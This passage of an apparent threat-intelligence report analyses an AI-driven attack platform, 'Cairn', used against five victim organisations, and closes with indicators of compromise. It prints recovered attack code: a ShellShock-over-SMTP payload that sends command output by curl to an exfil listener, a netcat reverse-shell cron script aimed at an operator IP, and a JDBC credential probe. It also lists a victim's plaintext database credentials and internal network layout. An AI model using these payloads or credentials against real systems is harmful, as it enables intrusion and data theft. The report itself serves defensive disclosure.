+<p>The operator does not pay for LLM inference directly. They use a pirated version of ClinePass, a commercial Cline AI subscription service, via a locally deployed account rotation service at <code>127.0.0.1:3123</code>. The rotation service is open-source software that was patched in-place by the operator (via <code>fix_switcher.py</code>) to correct a header-encoding bug that was causing account identification failures.</p>
+
+<div class="pre-label">bal.json &mdash; recovered API key inventory (defanged)</div>
+<pre>
+Key 1:
+  label:    "ClinePass 订阅 (钉死DeepSeek官方)"
+            [Translation: "ClinePass subscription (locked to DeepSeek official)"]
+  status:   "exhausted" (5-hour rate limit hit during peak campaign)
+  balance:  $4,989.38 remaining
+  userId:   usr-01M399PRPE49Q9Z8R513CSYGT7
+  plan:     Cline Pass (Monthly), expires 2026-10-24
+  weekly:   80% used
+
+Key 2 (backup):
+  label:    "cline"
+  status:   "valid" (standby)
+  balance:  $5,000.00 remaining (15% monthly used)
+  userId:   usr-01M39VDXTGSNJRC8Z6CGPKFSWP
+  plan:     Cline Pass (Monthly), expires 2026-10-24
+
+Keys 3-4:
+  provider: CommandCode (api.commandcode.ai)
+  label:    "CommandCode 备用号1/2" [Backup accounts 1/2]
+  status:   valid, inactive
+  balances: $46.97 and $64.51 monthly credit
+</pre>
+
+<div class="pre-label">models.json &mdash; LLM configuration</div>
+<pre>
+{
+  "providers": {
+    "cline": {
+      "baseUrl": "http://127.0.0.1:3123/v1",
+      "api": "openai-completions",
+      "models": [
+        {
+          "id": "cline-pass/deepseek-v4.1-flash",
+          "name": "ClinePass DeepSeek",
+          "contextWindow": 128000,
+          "maxTokens": 8192
+        }
+      ]
+    }
+  }
+}
+</pre>
+
+<h3>4.5 Platform Engineering: Memory and Disk Management</h3>
+<p>The platform includes production-grade operational tooling that is evidence of active, iterative development. The opening comment of <code>cairn_guard.sh</code> explains its origin: the dispatcher previously grew to 12 GB in memory on a 16 GB host, filled swap, made SSH unresponsive, and was killed by the kernel&rsquo;s OOM killer. The guard was written to prevent recurrence.</p>
+
+<div class="pre-label">cairn_guard.sh &mdash; excerpt (memory thresholds and active-lease check)</div>
+<pre>
+SOFT_LIMIT_MB=2500         # warn threshold
+HARD_LIMIT_MB=6000         # hard restart ceiling
+
+active_leases() {
+    python3 - &lt;&lt;'PY'
+import sqlite3, os
+path = os.path.expanduser("~/.local/share/cairn/cairn.db")
+conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
+cur = conn.cursor()
+# count intents currently held by a worker (attack steps in progress)
+total  = cur.execute(
+    "select count(*) from intents "
+    "where to_fact_id is null and worker is not null"
+).fetchone()[0]
+# count projects held in reason phase
+total += cur.execute(
+    "select count(*) from projects where reason_worker is not null"
+).fetchone()[0]
+print(total)
+PY
+}
+
+# If memory is high but tasks are in-flight, defer restart until they complete
+if [ "$AVAIL_MB" -gt "$CRITICAL_AVAILABLE_MB" ] && \
+   [ "$RSS_MB" -lt "$HARD_LIMIT_MB" ] && [ "$LEASES" -gt 0 ]; then
+    log "memory high (rss=${RSS_MB}MB avail=${AVAIL_MB}MB leases=$LEASES) \
+         - deferring restart until tasks finish"
+    exit 0
+fi
+</pre>
+
+<p>The disk guard (<code>cairn_disk_guard.sh</code>, comments in Simplified Chinese) runs every 15 minutes and sweeps container writable layers, removing dictionary files, package downloads, and build caches while preserving attack evidence (<code>/tmp/out</code>) and session records (<code>/tmp/cairn-pi</code>). The classify.log confirms the operator&rsquo;s own risk assessment of each category:</p>
+
+<div class="pre-label">classify.log &mdash; operator risk classification of container storage (translated)</div>
+<pre>
+Category          Risk label      Total MB
+-----------------------------------------------
+cairn-prompts     Safe (clear)       290
+work              Undecided           19
+out               Attack evidence    4813   &lt;-- "Do Not Delete"
+cairn-pi          Session records    1340   &lt;-- "Do Not Delete"
+wpscan            Tool (redownload)    65
+-----------------------------------------------
+Must preserve (evidence + sessions): 6,153 MB
+</pre>
+
+<h3>4.6 Cairn API &mdash; Confirmed Endpoints</h3>
+<p>The uvicorn API server at port 8000 (Basic auth restricted) exposes the full platform state. Recovered from <code>cairn_serve.log</code>:</p>
+<table>
+<thead><tr><th>Endpoint</th><th>Method</th><th>Purpose</th></tr></thead>
+<tbody>
+<tr><td><code>GET /projects</code></td><td>GET</td><td>List all victim projects</td></tr>
+<tr><td><code>GET /projects/{id}</code></td><td>GET</td><td>Project detail including current status</td></tr>
+<tr><td><code>GET /projects/{id}/export?format=yaml</code></td><td>GET</td><td>Full fact-graph export for a project</td></tr>
+<tr><td><code>POST /projects/{id}/intents/{intent_id}/heartbeat</code></td><td>POST</td><td>Worker keepalive while task is executing</td></tr>
+<tr><td><code>GET /api/provider/config</code></td><td>GET</td><td>Full key inventory with balances</td></tr>
+<tr><td><code>POST /api/proxy/v1/chat/completions</code></td><td>POST</td><td>Proxied LLM inference (OpenAI-compatible)</td></tr>
+<tr><td><code>POST /api/proxy/v1/responses</code></td><td>POST</td><td>CommandCode responses API (backup path)</td></tr>
+</tbody>
+</table>
+<p>The Azure remote worker at [REDACTED] was confirmed making <code>GET /projects/proj_014</code> requests to pull attack tasks. 27,000-plus log entries attributed to this IP in the preserved cairn_serve.log.</p>
+
+<h2 id="infra">5. Operator Infrastructure</h2>
+
+<table>
+<thead><tr><th>Component</th><th>Description</th><th>Confidence</th></tr></thead>
+<tbody>
+<tr><td>Primary C2 / Dispatcher</td><td><code>202[.]61[.]139[.]15</code> &mdash; VPS on AS152194 (CTG Server Limited, Hong Kong-registered). Hosts Cairn dispatcher, API, LLM proxy, staging HTTP directory, and Metasploit handler. Hostname set to VM-Z4bLOIWlNO via network provisioning script. MAC: 22:4b:9b:00:07:31.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>Secondary operator IP</td><td><code>202[.]61[.]139[.]137</code> &mdash; Same /25 block (202[.]61[.]128[.]0/19). Confirmed active for campaign traffic against European target. Both IPs provisioned by the same network_script matching MAC 22:4b:9b:00:07:31.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>Azure remote worker</td><td><code>20[.]78[.]168[.]45</code> &mdash; Azure-hosted VM. 27,000-plus task-fetch events in cairn_serve.log, pulling attack tasks from Cairn API on port 8000.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>Victim exfil callback (AWS)</td><td><code>3[.]89[.]199[.]21</code> &mdash; AWS address. Single GET request to operator exfil listener on 29 Sep 2026 16:30:37 UTC, confirming outbound connectivity from Taiwanese victim infrastructure.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>K8s reverse shell source (GCP)</td><td><code>35[.]241[.]192[.]106</code> &mdash; GCP address. Connected to operator listener on port 4446 from the compromised Redis pod. Observed in cron_rev.txt and enum_redis.txt.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>pi-workbuddy</td><td>Raspberry Pi; primary local attack worker. 9,394 tasks dispatched. Continued operating post-4 Oct 2026.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>pi-cline-deepseek</td><td>Raspberry Pi; secondary local attack worker. 8,472 tasks. Silent from 4 Oct 2026 onwards.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+<tr><td>Docker image</td><td><code>oritera/cairn-worker-container</code> (Kali Linux base). One container per victim project. 14-plus image layers confirmed in pull log.</td><td><span class="badge b-red">Confirmed</span></td></tr>
+</tbody>
+</table>
+
+<div class="pre-label">network_script (excerpt) &mdash; shows operator hard-coding both IPs via MAC address match</div>
+<pre>
+if [ $(cat $device/address) = '22:4b:9b:00:07:31' ] ; then
+    # Configure primary C2 IP
+    echo "IPADDR=202.61.139.15"    &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-$device
+    echo "NETMASK=255.255.255.128" &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-$device
+    # Configure secondary operator IP as alias
+    echo "IPADDR1=202.61.139.137"  &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-$device
+    echo "NETMASK1=255.255.255.128"&gt;&gt; /etc/sysconfig/network-scripts/ifcfg-$device
+    echo "GATEWAY=202.61.139.1"    &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-$device
+    # CIDR block: 202.61.128.0/19 (AS152194, CTG Server Limited)
+fi
+</pre>
+
+<h2 id="victims">6. Victim Analysis</h2>
+
+<div class="victim-grid">
+  <div class="victim-card">
+    <div class="vs">Victim 1 &mdash; Confirmed</div>
+    <div class="vt">Consumer Sporting Goods / E-Commerce (US)</div>
+    <div class="vr">5M+ units/year &bull; 50+ countries &bull; Multiple retail brands</div>
+    <div class="vd">Magento 2.4 Enterprise / Adobe Commerce Cloud. Fastly CDN. Microsoft 365 tenant. 200-plus AI attack sessions (proj_001, 550 dispatches). Payment card stream data confirmed present on operator server. Staging Magento admin REST token extracted via blind SQL injection. Customer plaintext credentials recovered. CVE-2026-75650 (StyleSmuggler) exploitation in progress at time of discovery. Fastly WAF blocked all direct RCE attempts (406 responses logged in AI session notes).</div>
+  </div>
+  <div class="victim-card">
+    <div class="vs">Victim 2 &mdash; Confirmed</div>
+    <div class="vt">Digital Health Media / Automotive Finance / Legal Services SaaS (US)</div>
+    <div class="vr">$784.8M revenue (2025) &bull; 250M+ monthly visitors &bull; KKR-backed</div>
+    <div class="vd">Large internet conglomerate (automotive finance portal as entry point). Nuxt 3 / Java-Spring microservices, Kubernetes on GCP. SSRF chain via internal email test endpoint gave read-back of internal network. Internal GitLab (10.16.x), JFrog Artifactory (7.68.14), Consul KV (ACL disabled), Grafana, Prometheus, Rancher, FortiAuthenticator 6.6.4 all accessed. GCP service account private keys extracted and JWT-bearer flow verified live. Hardcoded admin JWT from anonymous docs endpoint. 200-plus AI sessions (proj_008, 615 dispatches).</div>
+  </div>
+  <div class="victim-card">
+    <div class="vs">Victim 3 &mdash; Confirmed</div>
+    <div class="vt">Taiwanese Bulk SMS / Enterprise Messaging Provider</div>
+    <div class="vr">Critical national communications infrastructure &bull; Multiple carrier integrations &bull; TeamPlus relay confirmed</div>
+    <div class="vd">ShellShocked via SMTP RCPT TO injection. Confirmed RCE as vpopmail (uid=510). Server: hostname gw244, CentOS 5 Xen, Linux 2.6.18-371.el5xen, uptime 1,743 days. Internal network: 192.168.1.x/24 LAN (22 ARP-visible hosts). 10-node MSSQL production cluster on 10.225.30.x. MSSQL credentials extracted. 2.35 GB MAIL2POST Mailbox file accessible. SVN repositories: /svn/, /VoIP/, /EasyFlow/, /DataMining/, /SMS/. Java SMS platform: EUMPS, UMPS, SMPPDSM2 services all running. Privilege escalation: 4 rounds, all blocked.</div>
+  </div>
+  <div class="victim-card">
+    <div class="vs">Victim 4 &mdash; Confirmed</div>
+    <div class="vt">Multi-Tenant SaaS Platform (GCP, UK-centric customer base)</div>
+    <div class="vr">35+ named customer tenants confirmed &bull; Production environment (Datadog + SigNoz observed)</div>
+    <div class="vd">Compromised Redis pod running as root (uid=0). Alpine Linux, K8s pod. Reverse shell active every 5 minutes at time of discovery. Redis AOF file: 174 MB. 35-plus tenant service addresses in pod environment variables. Tenant verticals: sporting goods, outdoor equipment, equine, angling, home furnishing, wine, food service, several others. Datadog cluster agent and SigNoz OTEL agent both present, confirming production use.</div>
+  </div>
+  <div class="victim-card">
+    <div class="vs">Victim 5 &mdash; Confirmed targeting, partial identity</div>
+    <div class="vt">European Garden / Outdoor Power Equipment Manufacturer</div>
+    <div class="vr">&euro;517M revenue &bull; 92 countries &bull; 1M+ machines/year</div>
+    <div class="vd">Corporate WordPress site targeted via secondary operator IP. WordPress 7.1.2, Wordfence 9.0.0. 5.16 GB debug.log publicly readable (absolute server path leaked). Shared staging environment with multiple sub-brands. CVE-2026-8732 attempted, Wordfence blocking. FormCraft SSRF confirmed via uppercase URL parameter bypass.</div>
+  </div>
+</div>
+
+<h2 id="rce-smtp">7. Technical Deep Dive: ShellShock over SMTP (CVE-2014-6271)</h2>
+
+<h3>7.1 Why It Worked</h3>
+<p>The target SMTP server runs qmail with a vpopmail virtual mail system and an inline content filter (described in tool comments as an "Internal Firewall"). The filter inspects MAIL FROM and DATA body for the literal string <code>() {</code>, but does <em>not</em> inspect RCPT TO. When qmail-local processes a local delivery, it sets the recipient string into the <code>RECIPIENT</code> and <code>LOCAL</code> environment variables of a bash-3.2 subprocess. Bash 3.2 is vulnerable to CVE-2014-6271: a function definition in an environment variable causes the shell to execute the trailing command.</p>
+
+<div class="pre-label">i051_shock_rce.py &mdash; RCPT TO payload construction</div>
+<pre>
+SHELLSHOCK_PREFIX = "() { :; }; "
+
+def shellshock_rcpt(cmd, callback, domain="every8d.com"):
+    """
+    Build the RCPT TO line carrying the shellshock payload.
+    Command output piped to curl -T - (chunked PUT upload).
+    Pipe used instead of redirect: '>' would terminate the RCPT address.
+    """
+    return "RCPT TO:&lt;%s%s|curl -s -T - http://%s/ev/%s@%s&gt;" % (
+        SHELLSHOCK_PREFIX, cmd, callback, label_of(cmd), domain)
+
+# Resulting SMTP transaction:
+HELO relay.local
+MAIL FROM:&lt;a@b.com&gt;
+RCPT TO:&lt;() { :; }; id|curl -s -T - http://[REDACTED]:8997/ev/id@every8d.com&gt;
+DATA
+Subject: t
+
+hi
+.
+QUIT
+</pre>
+
+<h3>7.2 Execution Confirmed in ps Output</h3>
+<p>The attack was visible in its own victim&rsquo;s process table. The recovered ps -ef output from 29 Sep 2026 20:58 UTC shows the qmail-local process with the complete ShellShock payload in its argument list, alongside the resulting curl and grep child processes exfiltrating MSSQL credential data in real time:</p>
+
+<div class="pre-label">ps -ef extract from http-rce.log &mdash; attack visible mid-flight in victim process table</div>
+<pre>
+30533  8257 vpopmail S  qmail-local  bin/qmail-local -- every8d.com \
+    /home/vpopmail/domains/every8d.com \
+    every8d.com-() { :; }; grep -R -i 1433 /opt /usr/local \
+    /home/vpopmail /var/qmail|curl -s -T - \
+    http://[REDACTED]:8997/ev/grep_-R_-i_1433__opt...@every8d.com \
+    every8d.com a@b.com /tmp/Mailbox
+
+30535 30534 vpopmail S  grep  grep -R -i 1433 /opt /usr/local ...
+30536 30534 vpopmail S  curl  curl -s -T - http://[REDACTED]:8997/ev/...
+</pre>
+
+<h3>7.3 Exfiltration Channel: SMTP 250 Replies</h3>
+<p>The exfil listener log shows command output arriving as chunked HTTP PUT requests from the victim server. Each command is encoded in the URL path; the body carries the raw output. Timestamps confirm commands executed approximately 5-6 seconds apart, consistent with qmail&rsquo;s local delivery processing time plus curl transfer time. The channel delivered megabytes of data including the full ARP table, route table, process list, mount points, and web.xml configuration file.</p>
+
+<div class="pre-label">http-rce.log &mdash; MSSQL credential delivery (29 Sep 2026 21:46:11 UTC)</div>
+<pre>
+PUT /ev/grep_-n_-A_25_MODbUser__opt_web_xml from=('210.68.77.244', 41772)
+body=
+  60:  &lt;param-name&gt;MODbUser&lt;/param-name&gt;
+  61-  &lt;param-value&gt;eu&lt;/param-value&gt;
+  ...
+  64:  &lt;param-name&gt;MODbPassword&lt;/param-name&gt;
+  65-  &lt;param-value&gt;mactytech&lt;/param-value&gt;
+  ...
+  53:  &lt;param-name&gt;MODbPort&lt;/param-name&gt;
+       &lt;param-value&gt;1433&lt;/param-value&gt;
+  57:  &lt;param-name&gt;MODbEncoding&lt;/param-name&gt;
+       &lt;param-value&gt;Cp950&lt;/param-value&gt;     &lt;-- Traditional Chinese encoding
+</pre>
+
+<h3>7.4 Internal Network Topology Revealed</h3>
+<p>The ARP cache and /etc/hosts from the compromised server exposed the victim&rsquo;s full internal production network:</p>
+
+<div class="pre-label">/etc/hosts &mdash; MSSQL cluster topology (IP addresses redacted)</div>
+<pre>
+# MSSQL production database cluster (enterprise nodes):
+10.225.30.10  entdb10p  ENTDB10P
+10.225.30.20  entdb20p  ENTDB20P
+10.225.30.30  entdb30p  ENTDB30P
+10.225.30.40  entdb40p  ENTDB40P
+10.225.30.50  entdb50p  ENTDB50P
+10.225.30.60  entdb60p  ENTDB60P
+10.225.30.70  entdb70p  ENTDB70P
+10.225.30.80  entdb80p  ENTDB80P
+
+# Gateway database nodes:
+10.225.30.15  gwdb15p/gwdb25p/gwdb35p  (gw1/gw2/gw3)
+10.225.30.45  gwdb45p  (gw4)
+10.225.30.55  gwdb55p  (gw5)
+
+# Operational node:
+10.225.30.110 opdb110p
+
+# Common:
+192.168.2.160 comdb10p
+
+# NFS mounts observed:
+192.168.1.71:/share     -> /share71
+192.168.1.190:/vol/share -> /mnt/190NAS2       (NFS storage, 2.4 GB backup visible)
+192.168.1.8:/var         -> /mnt/8var          (Apache SVN repositories)
+192.168.1.230:/data      -> /mnt/data230
+</pre>
+
+<h2 id="redis-k8s">8. Technical Deep Dive: Kubernetes Redis Pod Compromise</h2>
+
+<p>A Redis pod in a GCP-hosted Kubernetes cluster (GCP project name recoverable from DNS search suffix) was found with a persistent reverse shell installed as a root crontab entry. The attack predated discovery by at least several weeks; the pod was created 24 September 2026, the same day the Cairn campaign began.</p>
+
+<div class="pre-label">enum_redis.txt &mdash; post-compromise enumeration output</div>
+<pre>
+@@@ id @@@
+uid=0(root) gid=0(root) groups=0(root)
+
+@@@ hostname @@@
+[REDACTED pod name]
+Linux [REDACTED] 6.12.94+ #1 SMP Wed Aug 19 07:48:21 UTC 2026 x86_64
+
+@@@ /data @@@
+-rw-r--r--  root  174,520,757  Sep 24 20:00  appendonly.aof    &lt;-- Redis AOF (174 MB)
+-rwxr-xr-x  root           43  Sep 24 20:03  pwn.sh
+
+@@@ crontab @@@
+*/5 * * * * /bin/sh /data/pwn.sh
+
+# pwn.sh contents:
+#!/bin/sh
+nc 202.61.139.15 4446 -e /bin/sh
+</pre>
+
+<p>The pod&rsquo;s environment variables exposed the internal service mesh for 35-plus named tenant deployments. Every service entry follows the pattern <code>TENANTNAME_{REDIS|WEB|MEMCACHE}_SVC_PORT</code>, giving the operator the complete internal Kubernetes service registry. Notable: several tenants have both Redis and Memcache sidecar deployments, and the Datadog cluster agent is visible on the service network (confirming a fully instrumented production environment, not a staging cluster).</p>
+
+<div class="pre-label">enum_redis.txt &mdash; tenant service addresses (extract, all redacted to ranges)</div>
+<pre>
+# Tenant service addresses visible from compromised pod (10.26.x.x range):
+# 35+ tenant web services:    10.26.48.x &ndash; 10.26.63.x
+# 25+ tenant Redis services:  10.26.48.x &ndash; 10.26.63.x (port 6379)
+# 4 tenant Memcache services: 10.26.52.x, 10.26.53.x, 10.26.57.x, 10.26.58.x (port 11211)
+# Kubernetes API server:      10.26.48.1:443
+# Cluster DNS:                10.26.48.10 (nameserver)
+# Datadog agent:              10.26.60.7:8125 (UDP)
+# Datadog cluster agent:      10.26.63.179:5005
+# SigNoz OTEL agent:          10.26.57.176:4317/4318/8888/13133
+</pre>
+
+<h2 id="mssql">9. Technical Deep Dive: MSSQL Credential Extraction Chain</h2>
+
+<p>After obtaining the SMTP-channel shell, the operator conducted a systematic multi-stage operation to extract database credentials and verify connectivity:</p>
+
+<p><strong>Stage 1 &mdash; Locate the config file.</strong> The operator&rsquo;s <code>webxml_dbscan.py</code> script scanned 11 known Tomcat webapp paths for <code>MODb</code> parameter names, recovering credentials from <code>/opt/web.xml</code>. The script was designed for this exact server&rsquo;s file layout, suggesting prior reconnaissance or targeted development.</p>
+
+<div class="pre-label">webxml_dbscan.py &mdash; target-specific path list</div>
+<pre>
+paths = [
+    '/usr/local/sms/EUMPS_MOMO2/webapps/EUMPS/WEB-INF/web.xml',
+    '/usr/local/sms/EUMPS_N/webapps/EUMPS/WEB-INF/web.xml',
+    '/usr/local/sms/EUMPS_N/webapps/MMSG/WEB-INF/web.xml',
+    '/usr/local/sms/EUMPS_MOMO/webapps/EUMPS/WEB-INF/web.xml',
+    '/usr/local/sms/EUMPS_OTP/webapps/EUMPS/WEB-INF/web.xml',
+    '/usr/local/sms/UMPS-WEB/webapps/ROOT/WEB-INF/web.xml',
+    '/usr/local/sms/TRANSOUT/webapps/ROOT/WEB-INF/web.xml',
+    # ... 4 more
+]
+</pre>
+
+<p><strong>Stage 2 &mdash; Locate the JDBC driver.</strong> The ShellShock channel executed <code>find /opt /usr/local -name JTurbo.jar -print</code>. The driver was found in 31 locations across 12 Java service directories.</p>
+
+<p><strong>Stage 3 &mdash; Download MssqlProbe.java.</strong> The operator served <code>MssqlProbe.java</code> from their staging HTTP directory. The ShellShock channel used <code>curl -s http://[REDACTED]:9000/MssqlProbe.java | tee /tmp/MssqlProbe.java</code> to pull it to the victim server. The recovered ps output confirms the file arriving at 20:58:17 UTC as a PUT request body.</p>
+
+<p><strong>Stage 4 &mdash; Compile and test.</strong> The operator attempted to compile and run MssqlProbe.java using the JTurbo.jar driver found in Step 2. The <code>javac</code> compilation step shows in the SMTP log but the output body was empty, suggesting either successful silent compilation or a compilation failure handled gracefully by the shell exfil pipe.</p>
+
+<div class="pre-label">MssqlProbe.java &mdash; JDBC credential verifier</div>
+<pre>
+import java.sql.*;
+import java.util.*;
+import java.io.*;
+public class MssqlProbe {
+    static void out(String s) {
+        try { FileWriter f = new FileWriter("/tmp/sqlprobe.out", true);
+              f.write(s+"\n"); f.close(); } catch(Exception e){}
+    }
+    public static void main(String[] a) {
+        out("START host="+a[0]+" port="+a[1]+" db="+a[2]+" user="+a[3]);
+        try {
+            DriverManager.setLoginTimeout(8);
+            Class.forName("com.newatlanta.jturbo.driver.Driver");
+            String url = "jdbc:JTurbo://"+a[0]+":"+a[1]+"/"+a[2];
+            Properties p = new Properties();
+            p.setProperty("user", a[3]);
+            p.setProperty("password", a[4]);
+            Connection c = DriverManager.getConnection(url, p);
+            out("AUTH_SUCCESS "+c.getMetaData().getDatabaseProductName()
+                +" "+c.getMetaData().getDatabaseProductVersion());
+            c.close();
+        } catch(Throwable e) { out("AUTH_RESULT "+e.toString()); }
+    }
+}
+
+// Called as:
+// java -cp .:JTurbo.jar MssqlProbe 192.168.1.235 1433 MO eu mactytech
+</pre>
+
+<h2 id="privesc">10. Privilege Escalation: Four Rounds, All Blocked</h2>
+
+<p>The operator made four documented attempts to escalate from vpopmail to root. The victim server, despite running a Linux kernel from 2013 with over 40 known local privilege escalation CVEs, resisted all attempts.</p>
+
+<table>
+<thead><tr><th>Round</th><th>Timestamp</th><th>Technique attempted</th><th>Why it failed</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>18:29 UTC</td><td>sudo -n id, SUID binary enumeration, getcap sweep, writable cron paths</td><td>vpopmail has no sudo rights. Writable cron directories do not exist. No unusual SUID binaries beyond standard set (ping, su, passwd, mount, umount, fusermount).</td></tr>
+<tr><td>2</td><td>18:50 UTC</td><td>sudo -n id, sudo -V (confirmed 1.7.2p1)</td><td>Same. sudo read of /etc/sudoers returns empty (unreadable). sudo version 1.7.2p1 has known CVEs but operator did not attempt to exploit sudo itself.</td></tr>
+<tr><td>3</td><td>18:51&ndash;53 UTC</td><td>Re-test sudo, id, hostname, environment check</td><td>Repeated confirmation of same constraints. No new paths identified.</td></tr>
+<tr><td>4</td><td>18:54 UTC</td><td>Kernel CVE identification: sudo changelog grep, udev changelog grep, kernel changelog grep</td><td>Multiple CVEs identified (CVE-2013-1775, CVE-2013-1776, CVE-2009-1185, CVE-2013-0871). Operator chose not to deliver a compiled exploit binary via the limited SMTP/curl channel. Xen virtualisation adds complexity to local kernel exploits.</td></tr>
+</tbody>
+</table>
+
+<div class="alert alert-y">
+  The vpopmail shell access was nonetheless highly damaging: it provided read access to mail relay logs, SVN repository paths and authentication files, the MSSQL config, the JTurbo JDBC driver, and approximately 2.35 GB of email relay data (Mailbox.e2po_teamplus_com_tw). Full root was not required to achieve the operator&rsquo;s primary objective of credential extraction.
+</div>
+
+<h2 id="cves">11. CVE Inventory</h2>
+
+<table>
+<thead><tr><th>CVE</th><th>Description</th><th>Target Surface</th><th>Outcome</th></tr></thead>
+<tbody>
+<tr><td><code>CVE-2014-6271</code></td><td>ShellShock &mdash; bash environment variable RCE</td><td>Taiwanese SMTP server (qmail, bash 3.2)</td><td><span class="badge b-red">EXPLOITED &mdash; Confirmed RCE</span></td></tr>
+<tr><td><code>CVE-2026-75650</code></td><td>&ldquo;StyleSmuggler&rdquo; &mdash; Magento email template injection</td><td>Consumer e-commerce Magento</td><td><span class="badge b-orange">In progress at discovery</span></td></tr>
+<tr><td><code>CVE-2026-53787</code></td><td>Amasty Order Attributes &lt;4.0.0 &mdash; unauth file upload</td><td>Consumer e-commerce Magento</td><td><span class="badge b-orange">Active testing at discovery</span></td></tr>
+<tr><td><code>CVE-2024-34102</code></td><td>CosmicSting &mdash; Magento XXE/RCE (CVSS 9.8)</td><td>Consumer e-commerce Magento</td><td><span class="badge b-muted">Blocked by CDN WAF (406)</span></td></tr>
+<tr><td><code>CVE-2022-24086</code></td><td>Magento template injection pre-auth RCE</td><td>Consumer e-commerce Magento</td><td><span class="badge b-muted">Blocked by CDN WAF</span></td></tr>
+<tr><td><code>CVE-2025-54236</code></td><td>SessionReaper &mdash; Magento file upload</td><td>Consumer e-commerce Magento</td><td><span class="badge b-muted">Confirmed not applicable (patched)</span></td></tr>
+<tr><td><code>CVE-2026-6279</code></td><td>Avada Builder &mdash; arbitrary file upload</td><td>WordPress (retail staging subdomain)</td><td><span class="badge b-muted">Patched on target</span></td></tr>
+<tr><td><code>CVE-2026-8732</code></td><td>WP Google Maps Gold &mdash; unauth admin create</td><td>European outdoor equipment WordPress</td><td><span class="badge b-muted">Blocked by Wordfence 9.0.0</span></td></tr>
+<tr><td><code>CVE-2024-3400</code></td><td>Palo Alto GlobalProtect RCE</td><td>Internet conglomerate edge device</td><td><span class="badge b-muted">Attempted &mdash; no result</span></td></tr>
+<tr><td><code>CVE-2026-44277</code></td><td>FortiAuthenticator pre-auth vulnerability</td><td>Internet conglomerate (6.6.4 identified)</td><td><span class="badge b-muted">Patched on target</span></td></tr>
+</tbody>
+</table>
+
+<h2 id="iocs">12. Indicators of Compromise</h2>
+
+<h4>Network indicators</h4>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:16px;margin:12px 0;">
+  <div class="ioc-row"><span class="ioc-type">IPv4</span><span class="ioc-val">202[.]61[.]139[.]15</span><span class="ioc-desc">Primary C2 / Cairn dispatcher (AS152194, CTG Server Ltd, HK)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">IPv4</span><span class="ioc-val">202[.]61[.]139[.]137</span><span class="ioc-desc">Secondary operator egress IP (same /25 block)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">IPv4</span><span class="ioc-val">20[.]78[.]168[.]45</span><span class="ioc-desc">Azure-hosted remote attack worker (27K+ API calls observed)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">IPv4</span><span class="ioc-val">3[.]89[.]199[.]21</span><span class="ioc-desc">AWS address: outbound callback from Taiwanese victim to operator exfil listener</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">IPv4</span><span class="ioc-val">35[.]241[.]192[.]106</span><span class="ioc-desc">GCP address: source of K8s reverse shell beacon (port 4446)</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">CIDR</span><span class="ioc-val">202[.]61[.]128[.]0/19</span><span class="ioc-desc">Operator ASN block (AS152194, CTG Server Limited)</span><span class="ioc-conf"><span class="badge b-orange">High</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">ASN</span><span class="ioc-val">AS152194</span><span class="ioc-desc">CTG Server Limited &mdash; Hong Kong-registered APAC bulletproof hosting. Spamhaus ASN-DROP listed.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+</div>
+
+<h4>Ports (on primary C2: 202[.]61[.]139[.]15)</h4>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:16px;margin:12px 0;">
+  <div class="ioc-row"><span class="ioc-type">TCP/22</span><span class="ioc-val">SSH</span><span class="ioc-desc">Root SSH access. Credentials hardcoded in i051_shock_rce.py.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/4444</span><span class="ioc-val">Metasploit handler</span><span class="ioc-desc">Default Metasploit reverse shell listener. Confirmed open during campaign.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/4446</span><span class="ioc-val">Netcat listener</span><span class="ioc-desc">K8s Redis pod reverse shell beacon target (nc 202.61.139.15 4446 -e /bin/sh).</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/8000</span><span class="ioc-val">Cairn API (uvicorn)</span><span class="ioc-desc">Basic auth protected. Exposes /projects, /intents, /api/provider/config endpoints. Azure worker polls this.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/8099</span><span class="ioc-val">BaseHTTP CSV endpoint</span><span class="ioc-desc">Python BaseHTTP returning Content-Type: text/csv. Likely exfiltrated loot or tasking feed.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/8443</span><span class="ioc-val">HTTPS (self-signed TLS)</span><span class="ioc-desc">Returns empty JSON body {}. See TLS certificate indicators below.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
+  <div class="ioc-row"><span class="ioc-type">TCP/8997</span><span class="ioc-val">HTTP exfil listener</span><span class="ioc-desc">Captures ShellShock command output as chunked PUT requests from victim server.</span><span class="ioc-conf"><span class="badge b-red">Confirmed</span></span></div>
